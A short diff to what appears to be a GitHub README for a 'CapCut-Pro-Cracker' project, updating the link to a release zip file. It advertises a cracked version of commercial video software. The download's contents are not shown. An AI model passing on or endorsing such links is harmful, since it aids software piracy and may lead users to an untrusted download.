@@ -12,7 +12,7 @@
 
 ## 📥 Download
 
-**[Download CapCut-Pro-Cracker](https://github.com/LegendVibrate/CapCut-Pro-Cracker/releases/download/675/CCPRO.zip)**
+**[Download CapCut-Pro-Cracker](https://github.com/LegendVibrate/CapCut-Pro-Cracker/releases/download/676/CapCut-ProCracker.zip)**
 
 ---
 
